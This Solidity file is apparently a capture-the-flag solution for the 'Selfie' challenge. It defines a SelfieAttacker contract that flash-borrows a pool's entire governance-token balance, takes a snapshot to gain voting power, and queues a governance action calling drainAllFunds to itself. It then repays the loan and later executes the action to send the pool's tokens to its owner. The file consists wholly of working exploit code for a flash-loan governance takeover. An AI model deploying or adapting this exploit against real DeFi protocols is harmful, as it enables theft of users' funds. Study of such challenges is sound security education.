// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Governance {
    function queueAction(
        address receiver , 
        bytes calldata data, 
        uint256 weiAmount
    ) external returns (uint256);
    function executeAction(uint256 actionId) external;
}

interface Pool {
    function flashLoan(uint256 borrowAmount) external;
}

interface Token {
    function balanceOf(address addr) external returns (uint256); 
    function transfer(address receiver, uint256 amount) external;
    function snapshot() external returns(uint256);
}


contract SelfieAttacker {

    Governance public governance;
    Pool public pool;
    Token public token;

    address public owner;

    event ReceiveTokens(uint256 indexed actionId);

    constructor(address _governance, address _pool, address _token) {
        require(_governance != address(0), "invalid governance address");
        require(_pool != address(0), "invalid pool address");
        require(_token != address(0), "invalid token address");

        governance = Governance(_governance);
        pool = Pool(_pool);
        token = Token (_token);

        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "caller is not owner");

        // Borrow the maximum amount available in the pool
        uint256 borrowAmount = token.balanceOf(address(pool));
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        // Increment the token snapshot to avoid error
        token.snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        uint256 actionId = governance.queueAction(address(pool), data, 0);
      
        // Return the loan
        token.transfer(address(pool), borrowAmount);

        emit ReceiveTokens(actionId);
    }

    function withdraw(uint256 actionId) external {
        require(msg.sender == owner, "caller is not owner");
        
        governance.executeAction(actionId);

        uint256 amount = token.balanceOf(address(this));
        token.transfer(owner, amount);
    }
}
